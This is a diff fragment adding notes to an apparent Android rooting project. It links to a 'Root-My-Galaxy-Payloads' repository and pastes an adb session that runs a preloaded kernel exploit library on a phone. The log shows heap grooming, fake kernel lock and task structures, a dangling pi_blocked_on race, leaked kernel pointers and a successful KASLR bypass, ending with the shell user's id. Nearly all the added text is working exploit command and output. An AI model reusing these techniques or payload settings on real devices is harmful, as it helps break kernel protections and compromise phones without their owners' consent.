@@ -158,3 +158,42 @@ git checkout ed1af3a -- .
 
 https://github.com/MakeDecisionWorth/Root-My-Galaxy-Payloads/tree/main
 https://github.com/MakeDecisionWorth/Root-My-Galaxy-Payloads/blob/main/src/targets/xperia1vi-jp-69.2.A.4.24/target.h
+
+
+
+
+PS C:\Users\Administrator> adb shell "SLIDE_OWNER_CHAIN_DELAY_USEC=0 SLIDE_REQUEUE_DELAY_USEC=50000 SLIDE_WAIT_NSEC=1000000000 SLIDE_ONLY=1 LD_PRELOAD=/data/local/tmp/preload.so id"
+[20:19:45] [+] preload starting pid=10163
+[20:19:45] [+] startup context pid=10163 uid=2000 euid=2000 gid=2000 egid=2000 attr=u:r:shell:s0 enforce=1
+[20:19:45] [+] build config pid=10163 label=shennong_OS3.0.307.0.WNBCNXM_16.0 p0_active=truephone slide=pselect main=pselect
+[20:19:45] [+] p0 profile pid=10163 phys_offset=0000000080000000 kernel_phys_load=00000000a8000000 delta=0000000028000000 slide_logger=ffffff8029fe29c8 bootid_data=ffffff802a24a458 init_task=ffffff8029fef600 root_tg=ffffff802a1d7580 sysctl_bootid=ffffff802a24a458
+[20:19:45] [-] perf_leak: perf_event_open failed errno=13
+[20:19:45] [*] prepare_kernel_page geom mode=1 standalone_tcp=1 main_tcp=0 mm_struct_sz=1024 objs_per_slab=32 collisions=8
+[20:19:59] [*] prepare_kernel_page leaked_mm=ffffff8904362400 base=ffffff8904360000 mode=1
+[20:19:59] [*] fake payload mode=1 write_shape=0 standalone_tcp=1 main_tcp=0 delta=0 bias=e80 lock=ffffff8904361350 w0=ffffff8904362220 task=ffffff8904365800 task_off=5800 fops_off=1000 lock_top_delta=0 write_parent=ffffff8029fe2930 write_right=0000000000000000 write_left=ffffff802a24a458
+[20:19:59] [*] sk_buff pcp send 1/1 ret=65536 errno=0
+[20:19:59] [*] sk_buff reclaim send 1/4 ret=65536 errno=0
+[20:19:59] [*] sk_buff reclaim send 2/4 ret=65536 errno=0
+[20:19:59] [*] sk_buff reclaim send 3/4 ret=65536 errno=0
+[20:19:59] [*] sk_buff reclaim send 4/4 ret=65536 errno=0
+[20:20:00] [*] slide attempt 1/20 uses pselect shift=1
+[20:20:00] [+] slide child context route=pselect pid=15553 uid=2000 euid=2000 gid=2000 egid=2000 attr=u:r:shell:s0 enforce=1
+[20:20:00] [*] slide consumer knobs core=1 consume_usec=0 consume_delay=2000 enter_delay=50000
+[20:20:00] [*] slide EDEADLK detected — activating fast path (pi_blocked_on dangling)
+[20:20:01] [*] slide waiter EDEADLK fast path — stack copying now (unlock deferred)
+[20:20:01] [*] slide tcp enter page=ffffff8904360000 fake_lock=ffffff8904361350 fake_w0=ffffff8904362220 fake_task=ffffff8904365800
+[20:20:01] [*] slide tcp pair client=7 server=8
+[20:20:01] [*] slide tcp punch fd=6 page_size=4096 len=16777216
+[20:20:01] [*] slide tcp punch map=0x7b6060e000
+[20:20:01] [*] slide tcp knobs attempts=2000 arm_seq=16 post_hold=20000
+[20:20:02] [*] slide consumer sched tid=15554 nice=1 alive_ret=0 alive_errno=0 sched_ret=0 sched_errno=0
+[20:20:02] [*] slide tcp seq=16 ret=0 errno=0 len=64 calls=1 sched_ok=0 last_sched_ret=-1 last_sched_errno=0
+[20:20:02] [*] slide tcp side effect calls=1 sched_ok=1
+[20:20:02] [*] slide EDEADLK fast path: stack copy done, reading stext
+[20:20:02] [+] slide boot_id_leaked_nfulnl_logger pid=15553 value=ffffff8029fe2930 stext=ffffff8027ffff68
+[20:20:02] [+] slide boot_id-derived_stext pid=15553 value=ffffff8027ffff68
+[20:20:02] [*] slide EDEADLK deferred unlock_chain ret=0 errno=0
+[20:20:02] [*] slide EDEADLK cleanup done (dangling pi_blocked_on cleared)
+[20:20:02] [+] slide-kaslr-ok pid=10163 base=ffffff8027ffff68 slide=ffffffc01fffff68
+[20:20:02] [+] slide-only done base=ffffff8027ffff68 slide=ffffffc01fffff68
+uid=2000(shell) gid=2000(shell) groups=2000(shell),1004(input),1007(log),1011(adb),1015(sdcard_rw),1028(sdcard_r),1078(ext_data_rw),1079(ext_obb_rw),3001(net_bt_admin),3002(net_bt),3003(inet),3006(net_bw_stats),3009(readproc),3011(uhid),3012(readtracefs) context=u:r:shell:s0
